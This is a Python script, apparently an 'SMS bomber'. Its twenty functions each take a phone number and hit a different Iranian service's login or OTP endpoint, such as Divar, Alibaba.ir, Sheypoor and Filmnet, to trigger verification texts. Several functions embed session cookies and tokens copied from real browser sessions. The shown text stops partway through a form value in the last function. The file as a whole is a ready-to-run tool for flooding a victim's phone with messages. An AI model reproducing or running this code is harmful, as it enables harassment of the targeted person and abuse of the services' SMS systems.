import requests


def api1(number):
    url = 'https://app.espard.com/api/v1/auth/identify-by-mobile'
    payload = {"data": {"mobile": number}, "oneSignalPlayerId": "", "appVersion": "1.5.0",
               "deviceId": "01B30DE7-EC61-438A-BDB3-FC6910AE7E5E", "deviceInfo": "x86_64", "deviceToken": "",
               "clientId": "com.espard.customer", "platform": "web", "osVersion": "10.2", "timeZone": "GMT+3:30",
               "time": "1597042718355"}
    x = requests.post(url, json=payload)
    print(x.text)


def api2(number):
    url = 'https://api.divar.ir/v5/auth/authenticate'
    myobj = {"phone": number}
    x = requests.post(url, json=myobj)
    print(x.text)


def api3(number):
    url = 'https://ws.alibaba.ir/api/v3/account/mobile/otp'
    myobj = {"phoneNumber": number}
    x = requests.post(url, json=myobj)
    print(x.text)


def api4(number):
    url = 'https://api.cllive.ir/authentication/otp'
    myobj = {"msisdn": number}
    x = requests.post(url, json=myobj)
    print(x.text)


def api5(number):
    url = f'https://core.gap.im/v1/user/add.json?mobile={number}'
    x = requests.post(url)
    print(x.text)


def api6(number):
    url = 'https://app.kardoon.ir:4433/api/users'
    myobj = {"optype": 15, "userid": 0, "mobile": number, "firstname": "", "lastname": "", "cityid": 0,
             "email": "", "birthdate": "", "gender": False, "avatarid": 0, "packagename": "", "versioncode": -1,
             "tokenkey": "", "username": "", "password": "", "connectionname": "MainConStr"}
    x = requests.post(url, json=myobj)
    print(x.text)


def api7(number):
    url = 'https://www.khanoumi.com/accounts/sendotp'
    myobj = {"mobile": number, "redirectUrl": "/"}
    x = requests.post(url, json=myobj)
    print(x.text)


def api8(number):
    url = 'https://bimebazar.com/accounts/api/login_sec/'
    myobj = {"username": number}
    x = requests.post(url, json=myobj)
    print(x.text)


def api9(number):
    url = 'https://api.baazigooshi.com/v1/usr/tp/sub/'
    myobj = {"phone": number, "organization_id": 2}
    x = requests.post(url, json=myobj)
    print(x.text)


def api10(number):
    headers = {
        'authority': 'gateway.filmgardi.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://filmgardi.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://filmgardi.com/',
        'accept-language': 'en-US,en;q=0.9',
    }

    data = f'{"code":"98","phone":"{number}","smsStatus":"default"}'

    response = requests.post('https://gateway.filmgardi.com/shenaseh/api/v2/auth/step-one', headers=headers, data=data)
    print(response.text)


def api11(number):
    response = requests.get(f'https://filmnet.ir/api-v2/access-token/users/{number}/otp')
    print(response)


def api12(number):
    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'LOCALE': 'FA',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/99.0.4844.82 Safari/537.36',
        # Already added when you pass json=
        # 'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'sec-ch-ua-mobile': '?0',
        'COUNTRY_ID': '2',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://kilid.com',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://kilid.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    params = {
        'realm': 'PORTAL',
    }

    json_data = {
        'mobile': number,
    }

    response = requests.post('https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start',
                             headers=headers, params=params, json=json_data)

    print(response.url)


def api13(number):
    cookies = {
        '_ga': 'GA1.2.1479085497.1647938972',
        '_gid': 'GA1.2.158321940.1647938972',
        '_gat': '1',
    }

    headers = {
        'authority': 'www.sheypoor.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json',
        'content-type': 'application/json;charset=UTF-8',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://www.sheypoor.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://www.sheypoor.com/session',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.1479085497.1647938972; _gid=GA1.2.158321940.1647938972; _gat=1',
    }

    data = f'{"username":{number}}'

    response = requests.post('https://www.sheypoor.com/api/v10.0.0/auth/send', headers=headers, cookies=cookies,
                             data=data)
    print(response.url)
    print(response.text)


def api14(number):
    cookies = {
        'PHPSESSID': 'cchqgtjufsjfreqrcoe3amtpi3',
        '_ga': 'GA1.2.1956684641.1647939699',
        '_gid': 'GA1.2.1217134356.1647939699',
        '_gat_gtag_UA_112391216_2': '1',
        '_gat_UA-112391216-2': '1',
        'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}',
        'analytics_token': '7ee59a4e-a888-1a6d-0f30-f7b0b1e53972',
        'analytics_session_token': '6d279bda-9969-afdf-6ed1-ea5f4f000d91',
        'yektanet_session_last_activity': '3/22/2022',
        '_yngt_iframe': '1',
        'lepopup-onload-yes-no-3': 'ilovefamily',
        '_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce',
        '__cf_bm': '108igAgzap52L6F9DcQm_fXGoAu9fPFn4fCiyCKIyOk-1647939701-0-AQNcHDbiBrfbqv2YWZhxhpQU2BM4zVN5qKj69mTxTSXyaRF4XAeaAjL7XmUkGTFjH2QShQsVIp243fPaNuOiUzyfGIYOvFZYud7AvHKmV+LQJU5ZvPe7dEFD3EszoTDXSg==',
    }

    headers = {
        'authority': 'turboyadak.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://turboyadak.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://turboyadak.com/reglogin',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': 'PHPSESSID=cchqgtjufsjfreqrcoe3amtpi3; _ga=GA1.2.1956684641.1647939699; _gid=GA1.2.1217134356.1647939699; _gat_gtag_UA_112391216_2=1; _gat_UA-112391216-2=1; analytics_campaign={%22source%22:%22direct%22%2C%22medium%22:null}; analytics_token=7ee59a4e-a888-1a6d-0f30-f7b0b1e53972; analytics_session_token=6d279bda-9969-afdf-6ed1-ea5f4f000d91; yektanet_session_last_activity=3/22/2022; _yngt_iframe=1; lepopup-onload-yes-no-3=ilovefamily; _yngt=31f33bf3-36005-5f720-06764-4d720f2d761ce; __cf_bm=108igAgzap52L6F9DcQm_fXGoAu9fPFn4fCiyCKIyOk-1647939701-0-AQNcHDbiBrfbqv2YWZhxhpQU2BM4zVN5qKj69mTxTSXyaRF4XAeaAjL7XmUkGTFjH2QShQsVIp243fPaNuOiUzyfGIYOvFZYud7AvHKmV+LQJU5ZvPe7dEFD3EszoTDXSg==',
    }

    data = {
        'action': 'newphoneexist',
        'phonenumber': number,
    }

    response = requests.post('https://turboyadak.com/wp-admin/admin-ajax.php', headers=headers, cookies=cookies,
                             data=data)

    print(response.url)


def api15(number):
    headers = {
        'authority': 'bimicity.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json',
        'sso': '',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://bimicity.ir',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://bimicity.ir/',
        'accept-language': 'en-US,en;q=0.9',
    }

    json_data = {
        'mobile': number,
        'sso': '',
    }

    response = requests.post('https://bimicity.ir/MasterApi/VerifyNumber', headers=headers, json=json_data)
    print(response.url)


def api16(number):
    cookies = {
        '_ga': 'GA1.2.217118632.1647940016',
        '_gid': 'GA1.2.1392001158.1647940016',
        '_gat_gtag_UA_204902871_2': '1',
        '_clck': '17u40ou|1|ezz|0',
        '_clsk': '1j2xbyv|1647940017810|1|1|l.clarity.ms/collect',
    }

    headers = {
        'authority': 'babimeh.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json',
        'sso': '',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://babimeh.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://babimeh.com/',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.217118632.1647940016; _gid=GA1.2.1392001158.1647940016; _gat_gtag_UA_204902871_2=1; _clck=17u40ou|1|ezz|0; _clsk=1j2xbyv|1647940017810|1|1|l.clarity.ms/collect',
    }

    json_data = {
        'mobile': number,
        'sso': '',
    }

    response = requests.post('https://babimeh.com/MasterApi/VerifyNumber', headers=headers, cookies=cookies,
                             json=json_data)

    print(response.url)


def api17(number):
    cookies = {
        '_ga': 'GA1.2.217118632.1647940016',
        '_gid': 'GA1.2.1392001158.1647940016',
        '_gat_gtag_UA_204902871_2': '1',
        '_clck': '17u40ou|1|ezz|0',
        '_clsk': '1j2xbyv|1647940017810|1|1|l.clarity.ms/collect',
    }

    headers = {
        'authority': 'babimeh.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'accept': 'application/json',
        'sso': '',
        # Already added when you pass json=
        # 'content-type': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://babimeh.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://babimeh.com/',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '_ga=GA1.2.217118632.1647940016; _gid=GA1.2.1392001158.1647940016; _gat_gtag_UA_204902871_2=1; _clck=17u40ou|1|ezz|0; _clsk=1j2xbyv|1647940017810|1|1|l.clarity.ms/collect',
    }

    json_data = {
        'mobile': number,
        'sso': '',
    }

    response = requests.post('https://anybime.com/MasterApi/VerifyNumber', headers=headers, cookies=cookies,
                             json=json_data)

    print(response.url)


def api18(number):
    cookies = {
        '.AspNetCore.Session': 'CfDJ8DKUphC74udIoA%2Fc6ZAeOnohjI05qq6sczDiEKftLnuWvBXTAcUu%2BhvgR6fBxt5WHIgveCIBXtTYwCe8w2tajPBBDjB4TdKBUhRQfZtoc6nZ6OMkRVc8ud2N8c1hkD7IZgHrzcn31yuxXV67kpJP1usKYXlPcrW2iAvuOKdnYHC2',
        '_ga': 'GA1.2.1249474695.1647940278',
        '_gid': 'GA1.2.969396690.1647940278',
        '_gat_UA-165275076-3': '1',
    }

    headers = {
        'authority': 'iris.ir',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'content-type': 'application/x-www-form-urlencoded',
        'accept': '*/*',
        'origin': 'https://iris.ir',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://iris.ir/',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '.AspNetCore.Session=CfDJ8DKUphC74udIoA%2Fc6ZAeOnohjI05qq6sczDiEKftLnuWvBXTAcUu%2BhvgR6fBxt5WHIgveCIBXtTYwCe8w2tajPBBDjB4TdKBUhRQfZtoc6nZ6OMkRVc8ud2N8c1hkD7IZgHrzcn31yuxXV67kpJP1usKYXlPcrW2iAvuOKdnYHC2; _ga=GA1.2.1249474695.1647940278; _gid=GA1.2.969396690.1647940278; _gat_UA-165275076-3=1',
    }

    data = {
        'user': number,
    }

    response = requests.post('https://iris.ir/Login/LoginYekbarMasraf', headers=headers, cookies=cookies, data=data)
    print(response.url)
    return response.url


def api19(number):
    headers = {
        'Connection': 'keep-alive',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryhZ0sC8MOh7yy8uVC',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'sec-ch-ua-platform': '"Windows"',
        'Origin': 'https://sabim.com',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://sabim.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    data = f'------WebKitFormBoundaryhZ0sC8MOh7yy8uVC\r\nContent-Disposition: form-data; ' \
           f'name="command"\r\n\r\nregister_user\r\n------WebKitFormBoundaryhZ0sC8MOh7yy8uVC\r\nContent-Disposition: ' \
           f'form-data; name="user_mobile"\r\n\r\n{number}\r\n------WebKitFormBoundaryhZ0sC8MOh7yy8uVC--\r\n '

    response = requests.post('https://api.sabim.com/api/userlogin', headers=headers, data=data)
    print(response.url)


def api20(number):
    cookies = {
        '.ASPXANONYMOUS': 'lqK-sN522AEkAAAAZGQyMzBhMWYtMDczOS00N2U0LWIzNWUtOWM1NDAwNzg3OWVlbqjSe3s-RCEhSb3ZJvuSCWtyIQw9s8Rj7VolxNcm-u81',
        'ASP.NET_SessionId': 'nzvwc2bwxdatkkwgdtdvcatj',
        '_ga': 'GA1.2.1376453552.1648215203',
        '_gid': 'GA1.2.1164275721.1648215203',
        'crisp-client%2Fsession%2Fda900cf8-fe06-4013-8adc-4aceeda9b26b': 'session_e5c8b5e2-ba92-4128-ae4e-23438982d27f',
        '_gat': '1',
    }

    headers = {
        'authority': 'digiyazd.com',
        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
        'sec-ch-ua-mobile': '?0',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'cache-control': 'no-cache',
        'x-requested-with': 'XMLHttpRequest',
        'x-microsoftajax': 'Delta=true',
        'sec-ch-ua-platform': '"Windows"',
        'accept': '*/*',
        'origin': 'https://digiyazd.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://digiyazd.com/logindigiyazd',
        'accept-language': 'en-US,en;q=0.9',
        # Requests sorts cookies= alphabetically
        # 'cookie': '.ASPXANONYMOUS=lqK-sN522AEkAAAAZGQyMzBhMWYtMDczOS00N2U0LWIzNWUtOWM1NDAwNzg3OWVlbqjSe3s-RCEhSb3ZJvuSCWtyIQw9s8Rj7VolxNcm-u81; ASP.NET_SessionId=nzvwc2bwxdatkkwgdtdvcatj; _ga=GA1.2.1376453552.1648215203; _gid=GA1.2.1164275721.1648215203; crisp-client%2Fsession%2Fda900cf8-fe06-4013-8adc-4aceeda9b26b=session_e5c8b5e2-ba92-4128-ae4e-23438982d27f; _gat=1',
    }

    data = {
        'ctl00$ContentPlaceHolder1$ScriptManager1': 'ctl00$ContentPlaceHolder1$UpdatePanel1|ctl00$ContentPlaceHolder1$Button_sendKod',
        '__EVENTTARGET': '',
        '__EVENTARGUMENT': '',
        '__VIEWSTATE': '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